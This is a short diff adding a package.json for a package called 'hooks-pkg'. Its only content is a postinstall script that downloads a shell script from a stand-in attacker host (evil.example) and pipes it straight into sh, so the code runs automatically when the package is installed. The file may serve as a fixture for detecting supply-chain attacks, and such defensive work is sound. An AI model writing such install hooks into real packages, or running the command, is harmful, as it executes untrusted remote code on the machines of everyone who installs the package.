@@ -1,0 +1,7 @@
+{
+  "name": "hooks-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://evil.example/x.sh | sh"
+  }
+}
